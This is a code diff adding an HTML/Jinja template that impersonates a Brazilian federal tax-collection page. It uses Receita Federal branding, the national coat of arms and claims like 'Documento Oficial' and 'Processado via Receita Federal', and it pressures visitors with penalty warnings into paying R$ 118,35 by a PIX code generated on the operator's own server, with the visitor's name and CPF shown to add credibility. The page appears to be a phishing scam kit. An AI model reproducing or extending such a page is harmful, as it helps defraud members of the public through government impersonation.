@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Guia de Recolhimento da União - Regularização Fiscal</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;700&display=swap" rel="stylesheet"/>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet"/>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
+    <style>
+        body {
+            font-family: 'Montserrat', Arial, sans-serif;
+        }
+        .inter {
+            font-family: 'Inter', sans-serif;
+        }
+        
+        .fade-in {
+            animation: fadeIn 0.5s ease-in;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .loading-spinner {
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #1e40af;
+            border-radius: 50%;
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body class="bg-[#fafbfc]">
+    <!-- Header -->
+    <div class="w-full bg-white border-b border-[#e5e7eb]">
+        <div class="max-w-sm mx-auto flex items-center pl-1 pr-2 py-2">
+            <img alt="Logo do Governo Federal com texto Pátria Amada Brasil, horizontal, fundo branco" 
+                 class="h-10 w-auto mr-3" 
+                 src="https://sites.ufpe.br/especializacao/wp-content/uploads/sites/11/2019/12/logo-patria-amada-brasil-horizontal.png" 
+                 style="max-width: 150px;"/>
+            <div>
+                <div class="text-[#222] text-[15px] font-medium leading-tight">
+                    Guia de Recolhimento da União
+                </div>
+                <div class="text-[#444] text-[12px] leading-tight">
+                    Regularização Fiscal • Receita Federal do Brasil
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Main Content -->
+    <div class="max-w-sm mx-auto px-2 pt-4 pb-6">
+        <div class="text-center">
+            <div id="nome-usuario" class="text-[#222] text-[18px] font-medium mb-1">
+                {% if customer and customer.nome %}{{ customer.nome.split(' ')[0]|upper }}, finalize sua regularização{% else %}Finalize sua regularização{% endif %}
+            </div>
+            <div class="text-[#444] text-[14px] mb-4">
+                Última etapa para quitação dos débitos fiscais
+            </div>
+            <div class="text-[#888] text-[13px] mb-0.5">
+                Total para quitação
+            </div>
+            <div id="valor-pagamento" class="text-[#222] text-[36px] font-light mb-0.5 leading-none">
+                R$ 118,35
+            </div>
+            <div class="text-[#888] text-[13px] mb-3">
+                Pagamento com Segurança Garantida.
+            </div>
+            <div class="flex justify-center mb-4">
+                <div class="border-l-2 border-[#e5e7eb] pl-2 text-left">
+                    <div class="text-[#444] text-[12px] font-medium">
+                        Regularização obrigatória
+                    </div>
+                    <div class="text-[#888] text-[12px]">
+                        Evite aplicação de penalidades e restrições fiscais
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- QR Code Section -->
+        <div id="qr-section" class="flex justify-center mb-4">
+            <div class="bg-white rounded-xl shadow p-2">
+                <img id="qr-code-img" 
+                     alt="QR Code para pagamento PIX" 
+                     class="w-36 h-36 object-contain" 
+                     height="144" 
+                     width="144"
+                     src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMTQ0IiBoZWlnaHQ9IjE0NCIgdmlld0JveD0iMCAwIDE0NCAxNDQiIGZpbGw9Im5vbmUiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+CjxyZWN0IHdpZHRoPSIxNDQiIGhlaWdodD0iMTQ0IiBmaWxsPSIjRjNGNEY2Ii8+CjxjaXJjbGUgY3g9IjcyIiBjeT0iNzIiIHI9IjgiIGZpbGw9IiNEMUQ1REIiLz4KPHRLEHJBIGJHZD0iNzIiIHk9Ijg4IiB0ZXh0LWFuY2hvcj0ibWlkZGxlIiBmaWxsPSIjOUI5QjlCIiBmb250LXNpemU9IjEwIj5BZ3VhcmRlLi4uPC90ZXh0Pgo8L3N2Zz4="
+                     onerror="console.warn('QR fallback necessário');"
+                     onload="console.log('QR Code carregado com sucesso');"/>
+            </div>
+        </div>
+
+        <!-- Payment Status -->
+        <div id="payment-status" class="mb-4 text-center">
+            <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                <div class="text-blue-800 text-[14px] font-medium mb-1">Preparando pagamento...</div>
+                <div class="text-blue-600 text-[12px]">Aguarde enquanto geramos seu código PIX</div>
+            </div>
+        </div>
+
+        <!-- PIX Code Section -->
+        <div id="pix-section">
+            <div class="text-[#222] text-[15px] font-medium mb-1">
+                Código PIX
+            </div>
+            <div class="bg-white rounded-lg border border-[#e5e7eb] p-3 mb-4">
+                <textarea id="pix-code" 
+                          class="w-full text-[#444] text-[12px] font-mono bg-transparent border-none resize-none outline-none break-words leading-tight" 
+                          rows="4" 
+                          readonly 
+                          placeholder="Carregando código PIX..."></textarea>
+            </div>
+            <button id="copy-button" 
+                    class="w-full bg-[#1857d3] hover:bg-[#174fc2] text-white text-[16px] font-medium rounded-lg py-3 flex items-center justify-center transition-colors duration-150"
+                    onclick="copiarCodigo()">
+                <i class="far fa-copy mr-2 text-[15px]"></i>
+                Copiar código
+            </button>
+        </div>
+
+        <!-- Como quitar Section -->
+        <div class="inter mt-4">
+            <h1 class="text-[1rem] font-medium text-[#23272F] mb-3">Como quitar</h1>
+            <ol class="space-y-2 mb-4">
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">1</span>
+                    <span class="text-[#444950] text-[0.9rem]">Abra seu aplicativo bancário</span>
+                </li>
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">2</span>
+                    <span class="text-[#444950] text-[0.9rem]">Acesse a área PIX</span>
+                </li>
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">3</span>
+                    <span class="text-[#444950] text-[0.9rem]">Escaneie o QR Code ou cole o código</span>
+                </li>
+                <li class="flex items-start">
+                    <span class="flex items-center justify-center w-6 h-6 rounded-full bg-[#F3F4F6] text-[#6B7280] font-medium text-[0.75rem] mr-3">4</span>
+                    <span class="text-[#444950] text-[0.9rem]">Confirme a quitação</span>
+                </li>
+            </ol>
+
+            <div class="bg-[#F7F8FA] rounded-md px-3 py-3 mb-6">
+                <h2 class="text-[0.9rem] font-medium text-[#23272F] mb-1">Após a quitação</h2>
+                <p class="text-[#6B7280] text-[0.8rem] mb-2 leading-tight">
+                    Sua situação fiscal será regularizada automaticamente. Você receberá confirmação com todas as informações do protocolo:
+                </p>
+                <div class="text-[0.8rem]">
+                    <div class="mb-0.5">
+                        <span class="font-medium text-[#23272F]">Nome:</span>
+                        <span id="nome-confirmacao" class="text-[#444950]">{% if customer and customer.nome %} {{ customer.nome }}{% else %} carregando...{% endif %}</span>
+                    </div>
+                    <div class="mb-0.5">
+                        <span class="font-medium text-[#23272F]">CPF:</span>
+                        <span id="cpf-confirmacao" class="text-[#444950]">{% if customer and customer.cpf %} {{ customer.cpf }}{% else %} carregando...{% endif %}</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Brasão Oficial -->
+            <div class="flex justify-center mb-4">
+                <div class="flex flex-col items-center">
+                    <div class="w-16 h-16 rounded-full bg-green-700 flex items-center justify-center mb-2 shadow-lg">
+                        <img src="https://www.gov.br/planalto/pt-br/conheca-a-presidencia/biblioteca-da-pr/simbolos-nacionais/brasao-da-republica/brasaooficialcolorido.png" 
+                             alt="Brasão da República Federativa do Brasil" 
+                             class="w-12 h-12 object-contain">
+                    </div>
+                    <div class="text-[#444950] text-[0.7rem] font-medium text-center">
+                        GOVERNO FEDERAL
+                    </div>
+                    <div class="text-[#6B7280] text-[0.65rem] text-center">
+                        Documento Oficial
+                    </div>
+                </div>
+            </div>
+
+            <div class="border-t border-[#E5E7EB] pt-4 pb-2 flex flex-col items-center">
+                <div class="flex items-center mb-1">
+                    <span class="text-[#A1A6B0] text-[0.8rem] mr-1">
+                        <i class="fas fa-shield-alt"></i>
+                    </span>
+                    <span class="text-[#A1A6B0] text-[0.8rem] font-medium">Pagamento seguro</span>
+                </div>
+                <div class="text-[#C2C6CE] text-[0.7rem] mb-4 text-center leading-tight">
+                    Processado via Receita Federal • SSL • Dados criptografados
+                </div>
+                <button id="continuar-btn" 
+                        class="w-full bg-[#F7F8FA] text-[#A1A6B0] text-[0.9rem] font-medium rounded-md py-3 cursor-default" 
+                        disabled>
+                    Continuar após quitação
+                </button>
+                
+                <!-- Debug button (only visible in development) -->
+                <button id="verify-payment-btn" 
+                        class="mt-2 w-full bg-green-600 text-white text-[0.9rem] font-medium rounded-md py-2 hover:bg-green-700 transition-colors" 
+                        style="display: none;">
+                    <i class="fas fa-check-circle mr-1"></i>
+                    Verificar Pagamento
+                </button>
+            </div>
+        </div>
+    </div>
+
+<script>
+// Variáveis globais
+let transacaoId = null;
+let verificacaoInterval = null;
+let dadosUsuario = {};
+let lastCheckTime = 0;
+const CHECK_INTERVAL = 5000; // 5 segundos
+let pixGenerationInProgress = false;
+let pixAlreadyGenerated = false;
+
+document.addEventListener('DOMContentLoaded', function() {
+    console.log('PIX Payment Page loaded');
+    
+    // Extrair dados da URL
+    const urlParams = new URLSearchParams(window.location.search);
+    dadosUsuario = {
+        nome: urlParams.get('nome') || '{% if customer and customer.nome %}{{ customer.nome }}{% endif %}',
+        cpf: urlParams.get('cpf') || '{% if customer and customer.cpf %}{{ customer.cpf }}{% endif %}',
+        email: urlParams.get('email') || 'gerarpagamento@gmail.com'
+    };
+    
+    // Se não temos dados do backend, pegar da URL
+    if (!dadosUsuario.nome && urlParams.get('nome')) {
+        dadosUsuario.nome = urlParams.get('nome');
+    }
+    if (!dadosUsuario.cpf && urlParams.get('cpf')) {
+        dadosUsuario.cpf = urlParams.get('cpf');
+    }
+    
+    console.log('Dados do usuário:', dadosUsuario);
+    
+    // Verificar se não existe PIX já gerado antes de gerar novo
+    const pixInput = document.getElementById('pix-code');
+    if ((!pixInput || !pixInput.value || pixInput.value.length === 0) && dadosUsuario.nome && dadosUsuario.cpf) {
+        console.log('🎯 PIX não encontrado, gerando novo...');
+        gerarPIX();
+    } else if (pixInput && pixInput.value.length > 0) {
+        console.log('✅ PIX já existe, não gerando duplicado');
+    } else {
+        mostrarErro('Dados do cliente não encontrados');
+    }
+    
+    // Verificar pagamento automaticamente a cada 5 segundos
+    setInterval(verificarPagamento, 5000);
+});
+
+async function gerarPIX() {
+    try {
+        // Verificar se já está gerando PIX ou se já foi gerado
+        if (pixGenerationInProgress) {
+            console.log('🔄 PIX já está sendo gerado, aguardando...');
+            return;
+        }
+        
+        if (pixAlreadyGenerated) {
+            console.log('✅ PIX já foi gerado anteriormente');
+            return;
+        }
+        
+        // Verificar se já existe PIX code no input
+        const pixInput = document.getElementById('pix-code');
+        if (pixInput && pixInput.value && pixInput.value.length > 50) {
+            console.log('✅ PIX code já existe no input, não gerando duplicado');
+            pixAlreadyGenerated = true;
+            return;
+        }
+        
+        pixGenerationInProgress = true;
+        console.log('🚀 Iniciando geração de PIX...');
+        
+        // Mostrar loading state
+        document.getElementById('payment-status').innerHTML = `
+            <div class="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                <div class="flex items-center">
+                    <div class="animate-spin rounded-full h-4 w-4 border-b-2 border-blue-600 mr-2"></div>
+                    <div class="text-blue-800 text-[14px] font-medium">Gerando PIX...</div>
+                </div>
+                <div class="text-blue-600 text-[12px] mt-1">Aguarde alguns instantes</div>
+            </div>
+        `;
+
+        const dadosParaPIX = {
+            name: dadosUsuario.nome,  // API espera 'name', não 'nome'
+            cpf: dadosUsuario.cpf,
+            email: dadosUsuario.email
+        };
+        
+        console.log('Gerando PIX com dados:', dadosParaPIX);
+        
+        const response = await fetch('/generate-pix', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify(dadosParaPIX)
+        });
+        
+        if (!response.ok) {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        
+        const data = await response.json();
+        console.log('✅ Resposta da API PIX recebida:', data);
+        
+        if (data.success) {
+            transacaoId = data.transaction_id || data.order_id;
+            console.log('🔑 Transaction ID:', transacaoId);
+            console.log('📊 Dados completos recebidos:', data);
+            
+            // Tentar diferentes campos para o código PIX
+            const pixCode = data.pixCode || data.pix_code || data.pixQrCode || data.qr_code_image || '';
+            console.log('📝 Código PIX extraído:', pixCode ? 'SIM' : 'NÃO', '- Tamanho:', pixCode.length);
+            
+            if (pixCode && pixCode.length > 0) {
+                // Verificar se elementos existem
+                const pixInput = document.getElementById('pix-code');
+                const qrImg = document.getElementById('qr-code-img');
+                
+                console.log('🎯 Elementos encontrados:', {
+                    pixInput: !!pixInput,
+                    qrImg: !!qrImg
+                });
+                
+                if (pixInput) {
+                    pixInput.value = pixCode;
+                    console.log('✅ PIX code definido no textarea');
+                }
+                
+                // Tentar QR Code da resposta primeiro
+                const qrCodeImage = data.pixQrCode || data.qr_code_image || data.qrCodeImage;
+                if (qrCodeImage && qrImg) {
+                    qrImg.src = qrCodeImage;
+                    console.log('✅ QR Code da API definido');
+                } else {
+                    console.log('🔄 Gerando QR Code como fallback...');
+                    
+                    // Tentar APIs de QR Code como fallback
+                    const qrApis = [
+                        `https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=${encodeURIComponent(pixCode)}`,
+                        `https://chart.googleapis.com/chart?chs=200x200&cht=qr&chl=${encodeURIComponent(pixCode)}`,
+                        `https://quickchart.io/qr?text=${encodeURIComponent(pixCode)}&size=200`
+                    ];
+                    
+                    for (let i = 0; i < qrApis.length; i++) {
+                        try {
+                            if (qrImg) {
+                                qrImg.src = qrApis[i];
+                                console.log(`✅ QR Code gerado via API ${i + 1}`);
+                                break;
+                            }
+                        } catch (qrError) {
+                            console.warn(`⚠️ API QR ${i + 1} falhou:`, qrError);
+                        }
+                    }
+                }
+                
+                // Atualizar status de sucesso
+                document.getElementById('payment-status').innerHTML = `
+                    <div class="bg-green-50 border border-green-200 rounded-lg p-3">
+                        <div class="text-green-800 text-[14px] font-medium mb-1">PIX gerado com sucesso!</div>
+                        <div class="text-green-600 text-[12px]">Escaneie o QR Code ou copie o código</div>
+                    </div>
+                `;
+                
+                console.log('✅ PIX gerado com sucesso via', data.provider || 'provider desconhecido');
+                pixAlreadyGenerated = true;
+                
+            } else {
+                throw new Error('Código PIX não recebido da API');
+            }
+        } else {
+            throw new Error(data.message || 'Erro ao gerar PIX');
+        }
+    } catch (error) {
+        console.error('❌ Erro ao gerar PIX:', error);
+        mostrarErro('Erro ao gerar PIX: ' + error.message);
+    } finally {
+        pixGenerationInProgress = false;
+    }
+}
+
+async function verificarPagamento() {
+    if (!transacaoId) {
+        console.log('⏸️ Aguardando transaction ID...');
+        return;
+    }
+    
+    const now = Date.now();
+    if (now - lastCheckTime < CHECK_INTERVAL) {
+        return;
+    }
+    lastCheckTime = now;
+    
+    try {
+        console.log('🔍 Verificando pagamento:', transacaoId);
+        
+        const response = await fetch(`/check-payment-status/${transacaoId}`, {
+            method: 'GET',
+            headers: {
+                'Content-Type': 'application/json',
+            }
+        });
+        
+        if (!response.ok) {
+            // Se não conseguir verificar, log mas não mostra erro
+            console.warn('⚠️ Não foi possível verificar status do pagamento');
+            return;
+        }
+        
+        const result = await response.json();
+        console.log('Pagamento ainda pendente, status:', result.status);
+        
+        if (result.status === 'paid' || result.status === 'completed') {
+            console.log('✅ Pagamento confirmado!');
+            mostrarSucesso();
+            clearInterval(verificacaoInterval);
+        }
+        
+    } catch (error) {
+        console.error('Erro na verificação:', error);
+    }
+}
+
+function copiarCodigo() {
+    const pixCode = document.getElementById('pix-code');
+    if (pixCode && pixCode.value) {
+        navigator.clipboard.writeText(pixCode.value).then(() => {
+            const button = document.getElementById('copy-button');
+            const originalText = button.innerHTML;
+            button.innerHTML = '<i class="fas fa-check mr-2 text-[15px]"></i>Copiado!';
+            button.classList.add('bg-green-600');
+            button.classList.remove('bg-[#1857d3]');
+            
+            setTimeout(() => {
+                button.innerHTML = originalText;
+                button.classList.remove('bg-green-600');
+                button.classList.add('bg-[#1857d3]');
+            }, 2000);
+        }).catch(() => {
+            // Fallback para dispositivos que não suportam clipboard API
+            pixCode.select();
+            document.execCommand('copy');
+        });
+    }
+}
+
+function mostrarErro(mensagem) {
+    document.getElementById('payment-status').innerHTML = `
+        <div class="bg-red-50 border border-red-200 rounded-lg p-3">
+            <div class="text-red-800 text-[14px] font-medium mb-1">Erro</div>
+            <div class="text-red-600 text-[12px]">${mensagem}</div>
+        </div>
+    `;
+}
+
+function mostrarSucesso() {
+    document.getElementById('payment-status').innerHTML = `
+        <div class="bg-green-50 border border-green-200 rounded-lg p-3">
+            <div class="text-green-800 text-[14px] font-medium mb-1">✅ Pagamento confirmado!</div>
+            <div class="text-green-600 text-[12px]">Sua regularização fiscal foi processada</div>
+        </div>
+    `;
+    
+    const botaoContinuar = document.getElementById('continuar-btn');
+    if (botaoContinuar) {
+        botaoContinuar.disabled = false;
+        botaoContinuar.classList.remove('bg-[#F7F8FA]', 'text-[#A1A6B0]', 'cursor-default');
+        botaoContinuar.classList.add('bg-green-600', 'text-white', 'hover:bg-green-700', 'cursor-pointer');
+        botaoContinuar.textContent = 'Regularização concluída ✓';
+    }
+}
+</script>
+</body>
+</html>
